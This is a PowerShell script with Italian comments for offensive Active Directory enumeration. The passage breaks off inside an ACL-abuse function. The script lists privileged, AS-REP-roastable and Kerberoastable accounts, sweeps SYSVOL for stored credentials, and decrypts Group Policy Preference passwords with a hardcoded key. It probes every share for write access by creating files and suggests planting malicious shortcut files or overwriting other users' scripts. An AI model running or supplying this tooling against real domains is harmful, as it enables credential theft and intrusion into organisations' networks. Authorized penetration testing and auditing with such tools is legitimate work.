# AD-Enum.ps1 - Script di Enumerazione Active Directory Completo
# Uso: .\AD-Enum.ps1 oppure Import-Module .\AD-Enum.ps1; Invoke-ADEnum

#region Funzioni Helper


function Write-Banner {
    param([string]$Text)
    $line = "=" * 70
    Write-Host "`n$line" -ForegroundColor Cyan
    Write-Host "  $Text" -ForegroundColor Yellow
    Write-Host "$line`n" -ForegroundColor Cyan
}

function Write-Section {
    param([string]$Text)
    Write-Host "`n[+] $Text" -ForegroundColor Green
    Write-Host ("-" * 50) -ForegroundColor DarkGray
}

function Write-SubSection {
    param([string]$Text)
    Write-Host "    [*] $Text" -ForegroundColor Cyan
}

function Write-Finding {
    param(
        [string]$Label,
        [string]$Value,
        [switch]$Important
    )
    if ($Important) {
        Write-Host "        $Label : " -ForegroundColor Yellow -NoNewline
        Write-Host "$Value" -ForegroundColor Red
    } else {
        Write-Host "        $Label : " -ForegroundColor Gray -NoNewline
        Write-Host "$Value" -ForegroundColor White
    }
}

function Write-Warning {
    param([string]$Text)
    Write-Host "    [!] $Text" -ForegroundColor Red
}

function Write-Info {
    param([string]$Text)
    Write-Host "    [i] $Text" -ForegroundColor Blue
}

function LDAPSearch {
    param (
        [string]$LDAPQuery
    )
    
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
    
    $DirectorySearcher.PageSize = 1000
    $DirectorySearcher.SizeLimit = 0
    $DirectorySearcher.CacheResults = $false
    
    return $DirectorySearcher.FindAll()
}

#endregion

#region Funzioni di Enumerazione Base

function Get-DomainInfo {
    Write-Banner "INFORMAZIONI DOMINIO"
    
    try {
        $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        $forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        
        Write-Section "Dominio Corrente"
        Write-Finding "Nome Dominio" $domain.Name
        Write-Finding "Forest" $forest.Name
        Write-Finding "Domain Functional Level" $domain.DomainMode
        Write-Finding "Forest Functional Level" $forest.ForestMode
        Write-Finding "PDC Emulator" $domain.PdcRoleOwner.Name -Important
        
        Write-Section "Domain Controllers"
        foreach ($dc in $domain.DomainControllers) {
            Write-SubSection $dc.Name
            Write-Finding "IP Address" $dc.IPAddress
            Write-Finding "OS Version" $dc.OSVersion
            Write-Finding "Site" $dc.SiteName
        }
        
        Write-Section "Trust Relationships"
        $trusts = $domain.GetAllTrustRelationships()
        if ($trusts.Count -eq 0) {
            Write-Info "Nessun trust relationship trovato"
        } else {
            foreach ($trust in $trusts) {
                Write-SubSection "$($trust.TargetName)"
                Write-Finding "Trust Type" $trust.TrustType
                Write-Finding "Trust Direction" $trust.TrustDirection
            }
        }
    }
    catch {
        Write-Warning "Errore nel recupero info dominio: $_"
    }
}

function Get-DomainUsers {
    Write-Banner "UTENTI DEL DOMINIO"
    
    $users = LDAPSearch -LDAPQuery "(samAccountType=805306368)"
    $userCount = 0
    $adminUsers = @()
    $disabledUsers = @()
    $neverExpirePassword = @()
    $noPreauth = @()
    
    Write-Section "Analisi Utenti"
    
    foreach ($user in $users) {
        $props = $user.Properties
        $username = $props.samaccountname[0]
        $userCount++
        
        # Controlla UAC flags
        $uac = $props.useraccountcontrol[0]
        $isDisabled = ($uac -band 2) -ne 0
        $neverExpires = ($uac -band 65536) -ne 0
        $noKerbPreauth = ($uac -band 4194304) -ne 0
        
        # Categorizza utenti
        if ($isDisabled) { $disabledUsers += $username }
        if ($neverExpires) { $neverExpirePassword += $username }
        if ($noKerbPreauth) { $noPreauth += $username }
        
        # Controlla se admin
        $memberof = $props.memberof
        if ($memberof) {
            foreach ($group in $memberof) {
                if ($group -match "Domain Admins|Enterprise Admins|Administrators|Schema Admins") {
                    $adminUsers += $username
                    break
                }
            }
        }
    }
    
    Write-Finding "Totale Utenti" $userCount

    Write-Section "Lista Completa Utenti (Proprietà Non-Default)"
    $defaultProps = @('adspath','distinguishedname','dscorepropagationdata','instancetype','name','cn','objectcategory','objectclass','objectguid','objectsid','primarygroupid','samaccountname','samaccounttype','useraccountcontrol','usncreated','usnchanged','whenchanged','whencreated','codepage','countrycode','lastlogoff','lastlogon','logoncount','badpwdcount','badpasswordtime','pwdlastset','accountexpires','lastlogontimestamp')

    foreach ($user in $users) {
        $props = $user.Properties
        $username = $props.samaccountname[0]
        $interesting = @{}
        
        foreach ($propName in $props.PropertyNames) {
            if ($propName -notin $defaultProps) {
                $val = $props[$propName][0]
                if ($val -and $val.ToString().Trim()) { $interesting[$propName] = $val }
            }
        }
        
        if ($interesting.Count -gt 0) {
            Write-SubSection $username
            foreach ($k in $interesting.Keys) {
                if ($k -match 'pass|pwd|cred|secret|key|comment|info|script|home|profile' -or $interesting[$k] -match 'pass|pwd|cred|secret|\\\\') {
                    Write-Finding $k $interesting[$k] -Important
                } else {
                    Write-Finding $k $interesting[$k]
                }
            }
        } else {
            Write-Host "    [*] $username" -ForegroundColor DarkGray
        }
    }
    
    Write-Section "Utenti Privilegiati (IMPORTANTE!)"
    if ($adminUsers.Count -gt 0) {
        foreach ($admin in ($adminUsers | Sort-Object -Unique)) {
            Write-SubSection $admin
            $adminDetails = LDAPSearch -LDAPQuery "(samaccountname=$admin)"
            $groups = $adminDetails.Properties.memberof
            foreach ($g in $groups) {
                if ($g -match "CN=([^,]+)") {
                    $groupName = $matches[1]
                    if ($groupName -match "Admin|Operator|Manager") {
                        Write-Finding "Membro di" $groupName -Important
                    }
                }
            }
        }
    } else {
        Write-Info "Nessun utente admin trovato (strano!)"
    }
    
    Write-Section "Account con Kerberos Pre-Auth Disabilitata (AS-REP Roastable!)"
    if ($noPreauth.Count -gt 0) {
        foreach ($np in $noPreauth) {
            Write-Warning "$np - VULNERABILE AD AS-REP ROASTING!"
        }
    } else {
        Write-Info "Nessun account vulnerabile trovato"
    }
    
    Write-Section "Account con Password che Non Scade Mai"
    if ($neverExpirePassword.Count -gt 0) {
        foreach ($ne in $neverExpirePassword) {
            Write-SubSection $ne
        }
    }
    
    Write-Section "Account Disabilitati"
    if ($disabledUsers.Count -gt 0) {
        foreach ($dis in $disabledUsers) {
            Write-SubSection $dis
        }
    } else {
        Write-Info "Nessun account disabilitato"
    }
}

function Get-DomainGroups {
    Write-Banner "GRUPPI DEL DOMINIO"
    
    $groups = LDAPSearch -LDAPQuery "(objectCategory=group)"
    
    Write-Section "Gruppi Privilegiati"
    
    $privilegedGroups = @(
        "Domain Admins",
        "Enterprise Admins", 
        "Schema Admins",
        "Administrators",
        "Account Operators",
        "Backup Operators",
        "Server Operators",
        "Print Operators",
        "DnsAdmins",
        "Remote Desktop Users",
        "Remote Management Users"
    )
    
    foreach ($privGroup in $privilegedGroups) {
        $group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=$privGroup))"
        if ($group) {
            $members = $group.Properties.member
            Write-SubSection "$privGroup"
            if ($members) {
                foreach ($member in $members) {
                    if ($member -match "CN=([^,]+)") {
                        $memberName = $matches[1]
                        Write-Finding "Membro" $memberName -Important
                    }
                }
            } else {
                Write-Finding "Membri" "Nessuno"
            }
        }
    }
    
    Write-Section "Gruppi Custom (Non-Default)"
    
    $defaultGroups = @(
        "Domain Admins", "Domain Users", "Domain Computers", "Domain Controllers",
        "Domain Guests", "Enterprise Admins", "Schema Admins", "Administrators",
        "Users", "Guests", "Account Operators", "Backup Operators", "Server Operators",
        "Print Operators", "Replicator", "Remote Desktop Users", "Network Configuration Operators",
        "Performance Monitor Users", "Performance Log Users", "Distributed COM Users",
        "IIS_IUSRS", "Cryptographic Operators", "Event Log Readers", "Certificate Service DCOM Access",
        "RDS Remote Access Servers", "RDS Endpoint Servers", "RDS Management Servers",
        "Hyper-V Administrators", "Access Control Assistance Operators", "Remote Management Users",
        "Storage Replica Administrators", "DnsAdmins", "DnsUpdateProxy", "krbtgt",
        "Cert Publishers", "Enterprise Read-only Domain Controllers", "Read-only Domain Controllers",
        "Cloneable Domain Controllers", "Protected Users", "Key Admins", "Enterprise Key Admins",
        "Allowed RODC Password Replication Group", "Denied RODC Password Replication Group",
        "Group Policy Creator Owners", "RAS and IAS Servers", "Pre-Windows 2000 Compatible Access",
        "Incoming Forest Trust Builders", "Windows Authorization Access Group",
        "Terminal Server License Servers"
    )
    
    foreach ($group in $groups) {
        $groupName = $group.Properties.cn[0]
        if ($groupName -notin $defaultGroups) {
            $members = $group.Properties.member
            Write-SubSection "$groupName"
            if ($members) {
                foreach ($member in $members) {
                    if ($member -match "CN=([^,]+)") {
                        Write-Finding "Membro" $matches[1]
                    }
                }
            }
        }
    }
}

function Get-DomainComputers {
    Write-Banner "COMPUTER DEL DOMINIO"
    
    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
    
    Write-Section "Domain Controllers"
    $dcs = LDAPSearch -LDAPQuery "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
    foreach ($dc in $dcs) {
        $name = $dc.Properties.name[0]
        $os = $dc.Properties.operatingsystem[0]
        $osVer = $dc.Properties.operatingsystemversion[0]
        $dns = $dc.Properties.dnshostname[0]
        
        Write-SubSection $name
        Write-Finding "DNS" $dns
        Write-Finding "OS" "$os $osVer" -Important
    }
    
    Write-Section "Server"
    foreach ($computer in $computers) {
        $os = $computer.Properties.operatingsystem[0]
        if ($os -match "Server" -and $os -notmatch "Domain Controller") {
            $name = $computer.Properties.name[0]
            $dns = $computer.Properties.dnshostname[0]
            $osVer = $computer.Properties.operatingsystemversion[0]
            
            Write-SubSection $name
            Write-Finding "DNS" $dns
            Write-Finding "OS" "$os $osVer"
        }
    }
    
    Write-Section "Workstation"
    foreach ($computer in $computers) {
        $os = $computer.Properties.operatingsystem[0]
        if ($os -notmatch "Server") {
            $name = $computer.Properties.name[0]
            $dns = $computer.Properties.dnshostname[0]
            $osVer = $computer.Properties.operatingsystemversion[0]

            Write-SubSection $name
            Write-Finding "DNS" $dns
            Write-Finding "OS" "$os $osVer"
        }
    }
}

function Get-SPNs {
    Write-Banner "SERVICE PRINCIPAL NAMES (Kerberoastable)"
    
    $spnUsers = LDAPSearch -LDAPQuery "(&(samAccountType=805306368)(servicePrincipalName=*))"
    
    Write-Section "Account Utente con SPN (Kerberoastable!)"
    
    $found = $false
    foreach ($user in $spnUsers) {
        $username = $user.Properties.samaccountname[0]
        
        if ($username -eq "krbtgt") { continue }
        
        $found = $true
        $spns = $user.Properties.serviceprincipalname
        $pwdLastSet = [datetime]::FromFileTime([int64]$user.Properties.pwdlastset[0])
        
        Write-Warning "$username - VULNERABILE A KERBEROASTING!"
        Write-Finding "Password Last Set" $pwdLastSet
        
        foreach ($spn in $spns) {
            Write-Finding "SPN" $spn -Important
        }
        Write-Host ""
    }
    
    if (-not $found) {
        Write-Info "Nessun account utente con SPN trovato"
    }
}

function Get-PasswordPolicy {
    Write-Banner "PASSWORD POLICY"
    
    try {
        $policy = Get-ADDefaultDomainPasswordPolicy -ErrorAction SilentlyContinue
        
        Write-Section "Policy Password Dominio"
        Write-Finding "Lunghezza Minima" $policy.MinPasswordLength
        Write-Finding "Cronologia Password" $policy.PasswordHistoryCount
        Write-Finding "Età Massima Password" $policy.MaxPasswordAge
        Write-Finding "Età Minima Password" $policy.MinPasswordAge
        Write-Finding "Complessità Richiesta" $policy.ComplexityEnabled
        Write-Finding "Lockout Threshold" $policy.LockoutThreshold -Important
        Write-Finding "Lockout Duration" $policy.LockoutDuration
        Write-Finding "Lockout Observation Window" $policy.LockoutObservationWindow
    }
    catch {
        Write-Section "Policy Password (via net accounts)"
        $netAccounts = net accounts /domain 2>&1
        foreach ($line in $netAccounts) {
            if ($line -match ":") {
                Write-Host "        $line" -ForegroundColor White
            }
        }
    }
}

function Get-GPOs {
    Write-Banner "GROUP POLICY OBJECTS"
    
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $domainName = $domain.Name
    $PDC = $domain.PdcRoleOwner.Name
    
    #region GPO da LDAP
    Write-Section "GPO nel Dominio (LDAP)"
    
    try {
        $gpos = LDAPSearch -LDAPQuery "(objectCategory=groupPolicyContainer)"
        $gpoCount = 0
        
        foreach ($gpo in $gpos) {
            $name = $gpo.Properties.displayname[0]
            $path = $gpo.Properties.gpcfilesyspath[0]
            $guid = $gpo.Properties.cn[0]
            
            Write-SubSection $name
            Write-Finding "GUID" $guid
            Write-Finding "Path" $path
            $gpoCount++
        }
        Write-Host ""
        Write-Info "Totale GPO trovate: $gpoCount"
    }
    catch {
        Write-Warning "Impossibile enumerare GPO via LDAP: $_"
    }
    #endregion
    
    #region Scan SYSVOL
    Write-Section "Scansione SYSVOL per file sensibili"
    
    $sysvolPath = "\\$domainName\SYSVOL\$domainName"
    $policiesPath = "$sysvolPath\Policies"
    $scriptsPath = "$sysvolPath\scripts"
    
    # Pattern per trovare credenziali nei file
    $sensitivePatterns = @(
        'cpassword',
        'password\s*=',
        'passwd\s*=',
        'pwd\s*=',
        'credential',
        'secret',
        'connectionstring',
        'net use.*/user:',
        'runas\s+/user:'
    )
    
    $gppPasswords = @()
    $sensitiveFindings = @()
    $scriptsFound = @()
    $allFilesFound = @()
    
    # Test accesso a SYSVOL
    Write-SubSection "Test accesso SYSVOL"
    if (-not (Test-Path $sysvolPath -ErrorAction SilentlyContinue)) {
        Write-Warning "Impossibile accedere a SYSVOL: $sysvolPath"
        return
    }
    Write-Finding "SYSVOL" "Accessibile"
    
    # Scan TUTTO SYSVOL (non solo Policies)
    Write-SubSection "Scansione completa SYSVOL..."
    
    try {
        # Cerca TUTTI i file ricorsivamente
        $allFiles = Get-ChildItem -Path $sysvolPath -Recurse -File -ErrorAction SilentlyContinue
        
        Write-Finding "File totali trovati" $allFiles.Count
        
        foreach ($file in $allFiles) {
            $fileName = $file.Name
            $filePath = $file.FullName
            $fileExt = $file.Extension.ToLower()
            
            # Salva tutti i file trovati
            $allFilesFound += [PSCustomObject]@{
                Name = $fileName
                Path = $filePath
                Size = $file.Length
                LastModified = $file.LastWriteTime
                Extension = $fileExt
            }
            
            # Controlla TUTTI i file XML per cpassword (non solo Groups.xml)
            if ($fileExt -eq '.xml') {
                try {
                    $content = Get-Content $filePath -Raw -ErrorAction Stop
                    
                    # Cerca cpassword in QUALSIASI file XML
                    if ($content -match 'cpassword\s*=\s*"([^"]+)"') {
                        $cpassword = $matches[1]
                        
                        # Cerca userName
                        $userName = ""
                        if ($content -match 'userName\s*=\s*"([^"]+)"') {
                            $userName = $matches[1]
                        }
                        elseif ($content -match 'accountName\s*=\s*"([^"]+)"') {
                            $userName = $matches[1]
                        }
                        elseif ($content -match 'runAs\s*=\s*"([^"]+)"') {
                            $userName = $matches[1]
                        }
                        
                        # Decripta GPP password
                        $decrypted = Decrypt-GPPPassword -Cpassword $cpassword
                        
                        $gppPasswords += [PSCustomObject]@{
                            File = $filePath
                            FileName = $fileName
                            UserName = $userName
                            CPassword = $cpassword
                            DecryptedPassword = $decrypted
                        }
                    }
                    
                    # Cerca anche altri pattern sensibili in XML
                    foreach ($pattern in $sensitivePatterns) {
                        if ($pattern -eq 'cpassword') { continue }  # Già gestito sopra
                        
                        if ($content -imatch $pattern) {
                            $lines = $content -split "`n"
                            foreach ($line in $lines) {
                                if ($line -imatch $pattern -and $line.Trim().Length -gt 0 -and $line.Length -lt 500) {
                                    $sensitiveFindings += [PSCustomObject]@{
                                        File = $filePath
                                        FileName = $fileName
                                        Pattern = $pattern
                                        Line = $line.Trim().Substring(0, [Math]::Min(150, $line.Trim().Length))
                                    }
                                }
                            }
                            break
                        }
                    }
                }
                catch {}
            }
            
            # Controlla script e file di testo per credenziali
            if ($fileExt -match '^\.(ps1|vbs|bat|cmd|txt|ini|config|cfg|conf)$') {
                $scriptsFound += [PSCustomObject]@{
                    Name = $fileName
                    Path = $filePath
                    Size = $file.Length
                    LastModified = $file.LastWriteTime
                }
                
                try {
                    $content = Get-Content $filePath -Raw -ErrorAction Stop
                    
                    foreach ($pattern in $sensitivePatterns) {
                        if ($content -imatch $pattern) {
                            $lines = $content -split "`n"
                            foreach ($line in $lines) {
                                if ($line -imatch $pattern -and $line.Trim().Length -gt 0 -and $line.Length -lt 500) {
                                    $sensitiveFindings += [PSCustomObject]@{
                                        File = $filePath
                                        FileName = $fileName
                                        Pattern = $pattern
                                        Line = $line.Trim().Substring(0, [Math]::Min(150, $line.Trim().Length))
                                    }
                                }
                            }
                            break
                        }
                    }
                }
                catch {}
            }
        }
    }
    catch {
        Write-Warning "Errore scansione SYSVOL: $_"
    }
    #endregion
    
    #region Output risultati
    
    # GPP Passwords trovate
    if ($gppPasswords.Count -gt 0) {
        Write-Section "GPP PASSWORDS TROVATE! (CRITICO)"
        
        foreach ($gpp in $gppPasswords) {
            Write-Warning "Password GPP trovata in: $($gpp.FileName)"
            Write-Finding "Path completo" $gpp.File -Important
            if ($gpp.UserName) {
                Write-Finding "Username" $gpp.UserName -Important
            }
            Write-Finding "CPassword" $gpp.CPassword
            Write-Finding "Password decrittata" $gpp.DecryptedPassword -Important
            Write-Host ""
        }
    }
    
    # File con potenziali credenziali
    if ($sensitiveFindings.Count -gt 0) {
        Write-Section "POTENZIALI CREDENZIALI IN FILE ($($sensitiveFindings.Count) occorrenze)"
        
        # Raggruppa per file e rimuovi duplicati
        $groupedFindings = $sensitiveFindings | Group-Object -Property File
        
        foreach ($group in $groupedFindings) {
            $fileName = Split-Path $group.Name -Leaf
            Write-Warning "$fileName"
            Write-Finding "Path" $group.Name
            
            $uniqueFindings = $group.Group | Select-Object -Property Pattern, Line -Unique | Select-Object -First 5
            foreach ($finding in $uniqueFindings) {
                Write-Host "        [$($finding.Pattern)] " -ForegroundColor Yellow -NoNewline
                Write-Host "$($finding.Line)" -ForegroundColor White
            }
            
            if ($group.Group.Count -gt 5) {
                Write-Host "        ... e altre $($group.Group.Count - 5) occorrenze" -ForegroundColor DarkGray
            }
            Write-Host ""
        }
    }
    
    # Script trovati
    if ($scriptsFound.Count -gt 0) {
        Write-Section "Script e file di configurazione ($($scriptsFound.Count) trovati)"
        
        foreach ($script in ($scriptsFound | Select-Object -First 15)) {
            Write-Host "    [*] " -ForegroundColor Cyan -NoNewline
            Write-Host "$($script.Name)" -ForegroundColor White -NoNewline
            Write-Host " ($($script.Size) bytes)" -ForegroundColor DarkGray
            Write-Host "        $($script.Path)" -ForegroundColor Gray
        }
        
        if ($scriptsFound.Count -gt 15) {
            Write-Host ""
            Write-Info "... e altri $($scriptsFound.Count - 15) file"
        }
        
        Write-Host ""
        Write-Info "Controlla manualmente questi file per credenziali hardcoded!"
    }
    
    # Riepilogo
    if ($gppPasswords.Count -eq 0 -and $sensitiveFindings.Count -eq 0) {
        Write-Section "Riepilogo"
        Write-Info "Nessuna credenziale trovata automaticamente in SYSVOL"
    }
    #endregion
    
    #region Comandi utili
    Write-Section "Comandi utili"
    Write-Host "    # Cerca cpassword in tutti i file" -ForegroundColor Yellow
    Write-Host "    Get-ChildItem -Path '\\$domainName\SYSVOL' -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'cpassword' -List" -ForegroundColor Gray
    Write-Host ""
    Write-Host "    # Cerca password in tutti i file" -ForegroundColor Yellow  
    Write-Host "    Get-ChildItem -Path '\\$domainName\SYSVOL' -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password' -List" -ForegroundColor Gray
    Write-Host ""
    Write-Host "    # Da Kali - decritta GPP password" -ForegroundColor Yellow
    Write-Host "    gpp-decrypt '<cpassword>'" -ForegroundColor Gray
    #endregion
}

# Funzione per decrittare GPP password
function Decrypt-GPPPassword {
    param([string]$Cpassword)
    
    if ([string]::IsNullOrEmpty($Cpassword)) {
        return ""
    }
    
    # Chiave AES nota (pubblicata da Microsoft)
    $AesKey = [byte[]](0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,
                        0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                        0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,
                        0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
    
    try {
        # Aggiungi padding se necessario
        $mod = $Cpassword.Length % 4
        if ($mod -ne 0) {
            $Cpassword += '=' * (4 - $mod)
        }
        
        # Decodifica Base64
        $decoded = [Convert]::FromBase64String($Cpassword)
        
        # Decripta con AES
        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.KeySize = 256
        $aes.BlockSize = 128
        $aes.Key = $AesKey
        $aes.IV = New-Object byte[] 16
        
        $decryptor = $aes.CreateDecryptor()
        $decrypted = $decryptor.TransformFinalBlock($decoded, 0, $decoded.Length)
        
        return [System.Text.Encoding]::Unicode.GetString($decrypted)
    }
    catch {
        return "[Errore decrittazione]"
    }
}

function Get-DomainShares {
    Write-Banner "SHARE DI RETE"
    
    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
    
    Write-Section "Ricerca Share e verifica accesso"
    Write-Info "Utente corrente: $env:USERDOMAIN\$env:USERNAME"
    Write-Host ""
    
    # Funzione per enumerare share via WMI (più completa di net view)
    function Get-RemoteShares {
        param([string]$ComputerName)
        
        $shares = @()
        
        # Metodo 1: WMI (trova tutte le share incluse quelle con spazi)
        try {
            $wmiShares = Get-WmiObject -Class Win32_Share -ComputerName $ComputerName -ErrorAction Stop
            foreach ($share in $wmiShares) {
                $shares += [PSCustomObject]@{
                    Name = $share.Name
                    Path = $share.Path
                    Description = $share.Description
                    Type = $share.Type
                }
            }
            return $shares
        }
        catch {}
        
        # Metodo 2: Fallback a net view (parsing migliorato)
        try {
            $netView = net view "\\$ComputerName" 2>&1
            if ($netView -notmatch "error|non accessible|not find") {
                $inShareSection = $false
                foreach ($line in $netView) {
                    # Salta header
                    if ($line -match "^Share name") { $inShareSection = $true; continue }
                    if ($line -match "^-{5,}") { continue }
                    if ($line -match "^The command completed") { break }
                    
                    if ($inShareSection -and $line.Trim()) {
                        # Parse più robusto per nomi con spazi
                        if ($line -match "^(.+?)\s+(Disk|Print)\s*(.*)$") {
                            $shares += [PSCustomObject]@{
                                Name = $matches[1].Trim()
                                Path = ""
                                Description = $matches[3].Trim()
                                Type = if ($matches[2] -eq "Disk") { 0 } else { 1 }
                            }
                        }
                    }
                }
            }
        }
        catch {}
        
        return $shares
    }
    
    # Funzione per testare accesso a share
    function Test-ShareAccess {
        param(
            [string]$ComputerName,
            [string]$ShareName
        )
        
        $sharePath = "\\$ComputerName\$ShareName"
        
        try {
            # Prova a listare il contenuto
            $null = [System.IO.Directory]::GetDirectories($sharePath)
            return "READ"
        }
        catch [System.UnauthorizedAccessException] {
            return "DENIED"
        }
        catch {
            # Prova con Test-Path come fallback
            try {
                if (Test-Path $sharePath -ErrorAction Stop) {
                    return "READ"
                }
            }
            catch {}
            return "DENIED"
        }
    }
    
    # Funzione per testare accesso in scrittura
    function Test-WriteAccess {
        param([string]$SharePath)
        
        try {
            $testFile = Join-Path $SharePath ".test_write_$([guid]::NewGuid().ToString().Substring(0,8))"
            [System.IO.File]::Create($testFile).Close()
            Remove-Item $testFile -Force -ErrorAction SilentlyContinue
            return $true
        }
        catch {
            return $false
        }
    }
    
    $allShares = @()
    $accessibleShares = @()
    $writableShares = @()
    
    foreach ($computer in $computers) {
        $hostname = $computer.Properties.dnshostname[0]
        $name = $computer.Properties.name[0]
        if (-not $hostname) { continue }
        
        # Test connettività
        $tcpTest = $null
        try {
            $tcpTest = Test-NetConnection -ComputerName $hostname -Port 445 -WarningAction SilentlyContinue -ErrorAction SilentlyContinue
        }
        catch {
            # Fallback senza Test-NetConnection
            try {
                $socket = New-Object System.Net.Sockets.TcpClient
                $socket.Connect($hostname, 445)
                $tcpTest = @{ TcpTestSucceeded = $socket.Connected }
                $socket.Close()
            }
            catch {
                $tcpTest = @{ TcpTestSucceeded = $false }
            }
        }
        
        if (-not $tcpTest.TcpTestSucceeded) {
            Write-Host "    [*] $name - Non raggiungibile (porta 445)" -ForegroundColor DarkGray
            continue
        }
        
        $shares = Get-RemoteShares -ComputerName $hostname
        
        if ($shares.Count -eq 0) {
            Write-Host "    [*] $name - Nessuna share trovata o accesso negato" -ForegroundColor DarkGray
            continue
        }
        
        Write-SubSection "$name ($hostname)"
        
        foreach ($share in $shares) {
            $shareName = $share.Name
            $shareDesc = $share.Description
            $shareType = $share.Type
            
            # Determina tipo share
            $isHidden = $shareName.EndsWith('$')
            $isAdmin = $shareName -match '^(ADMIN\$|C\$|IPC\$)$'
            
            # Salta IPC$ (non accessibile come file share)
            if ($shareName -eq 'IPC$') { continue }
            
            # Test accesso
            $access = Test-ShareAccess -ComputerName $hostname -ShareName $shareName
            
            # Test scrittura se abbiamo accesso in lettura e non è share admin
            $writeAccess = $false
            if ($access -eq "READ" -and -not $isAdmin) {
                $writeAccess = Test-WriteAccess -SharePath "\\$hostname\$shareName"
            }
            
            # Salva per riepilogo
            $shareInfo = [PSCustomObject]@{
                Computer = $name
                Hostname = $hostname
                Share = $shareName
                Description = $shareDesc
                Hidden = $isHidden
                Access = $access
                Write = $writeAccess
            }
            $allShares += $shareInfo
            
            if ($access -eq "READ") {
                $accessibleShares += $shareInfo
                if ($writeAccess) {
                    $writableShares += $shareInfo
                }
            }
            
            # Output
            $accessColor = switch ($access) {
                "READ" { if ($writeAccess) { "Green" } else { "Yellow" } }
                "DENIED" { "Red" }
                default { "Gray" }
            }
            
            $accessText = switch ($access) {
                "READ" { if ($writeAccess) { "READ/WRITE" } else { "READ" } }
                "DENIED" { "DENIED" }
                default { "UNKNOWN" }
            }
            
            $shareDisplay = $shareName
            if ($shareDesc) { $shareDisplay += " ($shareDesc)" }
            if ($isHidden) { $shareDisplay += " [HIDDEN]" }
            
            Write-Host "        " -NoNewline
            Write-Host "$shareDisplay" -ForegroundColor White -NoNewline
            Write-Host " -> " -NoNewline
            Write-Host "[$accessText]" -ForegroundColor $accessColor
        }
    }
    
    # Riepilogo
    if ($accessibleShares.Count -gt 0) {
        Write-Section "SHARE ACCESSIBILI ($($accessibleShares.Count) trovate)"
        
        foreach ($share in $accessibleShares) {
            $accessType = if ($share.Write) { "READ/WRITE" } else { "READ" }
            $color = if ($share.Write) { "Green" } else { "Yellow" }
            
            Write-Host "    " -NoNewline
            Write-Host "\\$($share.Hostname)\$($share.Share)" -ForegroundColor White -NoNewline
            Write-Host " -> " -NoNewline
            Write-Host "[$accessType]" -ForegroundColor $color
            
            if ($share.Description) {
                Write-Host "        Descrizione: $($share.Description)" -ForegroundColor DarkGray
            }
        }
    }
    
    if ($writableShares.Count -gt 0) {
        Write-Section "SHARE CON ACCESSO IN SCRITTURA! ($($writableShares.Count) trovate)"
        
        foreach ($share in $writableShares) {
            Write-Warning "\\$($share.Hostname)\$($share.Share)"
        }
        
        Write-Host ""
        Write-Info "Possibili attacchi su share scrivibili:"
        Write-Host "        - Pianta file malevoli (.lnk, .scf, .url)" -ForegroundColor White
        Write-Host "        - Sovrascrivi script eseguiti da altri utenti" -ForegroundColor White
        Write-Host "        - Cerca file sensibili (password, config, backup)" -ForegroundColor White
    }
    
    # Share interessanti da investigare
    $interestingShares = $accessibleShares | Where-Object { 
        $_.Share -match 'backup|admin|config|password|secret|private|finance|hr|it|dev|important|confidential|restricted' -or
        $_.Description -match 'backup|password|config|important|confidential'
    }
    
    if ($interestingShares.Count -gt 0) {
        Write-Section "SHARE POTENZIALMENTE INTERESSANTI"
        
        foreach ($share in $interestingShares) {
            Write-Warning "\\$($share.Hostname)\$($share.Share)"
            if ($share.Description) {
                Write-Host "        Descrizione: $($share.Description)" -ForegroundColor Yellow
            }
        }
    }
}

function Get-ACLAbuse {
    Write-Banner "POTENZIALI ACL ABUSE"
    
    Write-Section "Ricerca permessi pericolosi su oggetti AD"
    Write-Info "Oggetti: Utenti, Gruppi, Computer, GPO, OU, Domain, AdminSDHolder, CertTemplates"
    Write-Info "Permessi: GenericAll, GenericWrite, WriteOwner, WriteDACL, Self, AllExtendedRight"
    Write-Host ""
    
    # Permessi pericolosi da cercare
    $dangerousRights = @(
        'GenericAll',
        'GenericWrite', 
        'WriteOwner',
        'WriteDacl',
        'Self',
        'ForceChangePassword',
        'AllExtendedRight'
    )
    
    # SID da ignorare (built-in/system accounts)
    $ignoredSIDs = @(
        'S-1-5-18',           # Local System
        'S-1-5-32-544',       # BUILTIN\Administrators
        'S-1-5-32-548',       # BUILTIN\Account Operators
        'S-1-5-32-549',       # BUILTIN\Server Operators
        'S-1-5-32-550',       # BUILTIN\Print Operators
        'S-1-5-9',            # Enterprise Domain Controllers
        'S-1-3-0',            # Creator Owner
        'S-1-5-10'            # Self
    )
    
    $findings = @()
    
    # Ottieni Domain SID per filtrare gruppi privilegiati
    $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $PDC = $domainObj.PdcRoleOwner.Name
    $DN = ([adsi]'').distinguishedName
    $domainSID = (New-Object System.Security.Principal.NTAccount($domainObj.Name, "Domain Admins")).Translate([System.Security.Principal.SecurityIdentifier]).Value
    $domainSID = $domainSID -replace '-512$', ''  # Rimuovi RID per ottenere Domain SID
    
    # SID di gruppi privilegiati da ignorare
    $privilegedGroupSIDs = @(
        "$domainSID-512",     # Domain Admins
        "$domainSID-519",     # Enterprise Admins
        "$domainSID-518",     # Schema Admins
        "$domainSID-500",     # Administrator
        "$domainSID-516",     # Domain Controllers
